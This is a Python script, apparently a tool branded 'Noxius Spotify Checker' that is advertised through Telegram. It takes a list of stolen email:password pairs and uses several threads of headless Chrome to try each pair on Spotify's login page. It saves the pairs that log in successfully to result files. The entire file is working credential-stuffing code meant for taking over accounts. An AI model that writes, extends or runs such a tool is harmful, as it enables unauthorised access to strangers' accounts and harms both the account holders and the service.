import selenium, selenium.webdriver, fade, os, threading, datetime, time; from colorama import Fore; from selenium.webdriver.common.by import By

W = Fore.LIGHTWHITE_EX
R = Fore.LIGHTRED_EX
G = Fore.LIGHTGREEN_EX
B = Fore.LIGHTBLUE_EX
Y = Fore.LIGHTYELLOW_EX
M = Fore.LIGHTMAGENTA_EX
C = Fore.LIGHTCYAN_EX
BLACK = Fore.LIGHTBLACK_EX

GUI = """
          ╔══════════════════════════════════════════════════════╗
          ║             [>] t.me/projectnoxius [<]               ║
          ╠══════════════════════════════════════════════════════╣
          ║          ╔╗╔ ╔═╗ ═╗╔═ ╦ ╦ ╦ ╔═╗                      ║
          ║          ║║║ ║ ║ ╔╩╚╗ ║ ║ ║ ╚═╗    @rotomicora_      ║
          ║          ╝╚╝ ╚═╝ ╩  ╩ ╩ ╚═╝ ╚═╝       v1.0           ║
          ║    ╔════════════════════════════════════════════╗    ║
          ║ ╔══╝       [!] NOXIUS SPOTIFY CHECKER [!]       ╚══╗ ║
          ╠═╝            [-] Telegram: @tcp_nx [-]             ╚═╣
          ╚══════════════════════════════════════════════════════╝
"""


FADED_GUI = fade.pinkred(GUI)
os.system("cls");print(FADED_GUI)
MAX_THREADS = 5
CURRENT_THREADS = 0
COMBO_PATH = input(f"{M}[{Y}>{M}] {BLACK}Combo path -{M}> {Y}")

RESULTS_PATH = f"results/{datetime.datetime.now().strftime('%d-%m-%Y %H.%M.%S')}"
print()
RESULTS_COMBOTYPE_FILE = f"{RESULTS_PATH}/ValidCombos.txt"
RESULTS_FILE = f"{RESULTS_PATH}/Valid.txt"

webDriverOptions = selenium.webdriver.ChromeOptions()

webDriverOptions.add_argument("--headless");webDriverOptions.add_argument("--disable-extensions");webDriverOptions.add_argument("--incognito");webDriverOptions.add_argument(f"--disable-extensions");webDriverOptions.add_experimental_option("excludeSwitches", ["enable-logging"])

URL = "https://accounts.spotify.com/es-ES/login"

if not os.path.exists(RESULTS_PATH):
    os.makedirs(RESULTS_PATH)

with open(RESULTS_COMBOTYPE_FILE, "w") as validCombosFile:
    validCombosFile.write("")

with open(RESULTS_COMBOTYPE_FILE, "r") as validCombosFile:
    validCombos = validCombosFile.readlines()

with open(COMBO_PATH, "r") as combosFile:
    allAccounts = combosFile.readlines()
    for i in allAccounts:
        if i == "":
            allAccounts.remove(i)

def checkAccount(account):
    global CURRENT_THREADS, validCombos
    CURRENT_THREADS += 1
    os.system(f"title [NOXIUS SPOTIFY CHECKER] Checking {len(allAccounts)} accounts")
    webDriver = selenium.webdriver.Chrome(options=webDriverOptions)
    webDriver.get(URL);webDriver.implicitly_wait(30)
    EMAIL, PASSWORD = account.split(":")
    webDriver.find_element(By.CSS_SELECTOR, "#login-username").send_keys(EMAIL)
    webDriver.find_element(By.CSS_SELECTOR, "#login-password").send_keys(PASSWORD)
    webDriver.find_element(By.CSS_SELECTOR, "#login-button").click()
    time.sleep(1.7)
    if webDriver.current_url == "https://accounts.spotify.com/es-ES/status" or webDriver.current_url == "https://open.spotify.com":
        print(f"{M}[{G}OK{M}] {BLACK}VALID ACCOUNT -{M}> {Y}{EMAIL}{M}:{Y}{PASSWORD}")
        with open(RESULTS_COMBOTYPE_FILE, "a") as validCombosFile:
            validCombosFile.write(f"{EMAIL}:{PASSWORD}")
        with open(RESULTS_FILE, "a") as validFile:
            validFile.write(f"{EMAIL}:{PASSWORD} -> [CHECKED BY NOXIUS SPOTIFY CHECKER -> T.ME/PROJECTNOXIUS]\n")
        CURRENT_THREADS -= 1
        webDriver.close()
    else:
        print(f"{M}[{W}BAD{M}] {R}INVALID ACCOUNT {BLACK}-{M}> {Y}{EMAIL}{M}:{Y}{PASSWORD}")
        CURRENT_THREADS -= 1
        webDriver.close()




for account in allAccounts:
    while True:
        if CURRENT_THREADS >= MAX_THREADS:
            time.sleep(0.5)
            continue
        break
    threading.Thread(target=checkAccount, args=(account,)).start()
    time.sleep(0.3)

while True:
    if CURRENT_THREADS == 0:
        print(f"{M}[{G}OK{M}] {BLACK}FINISHED CHECKING ACCOUNTS")
        break
    time.sleep(1)
os.system("pause >nul")
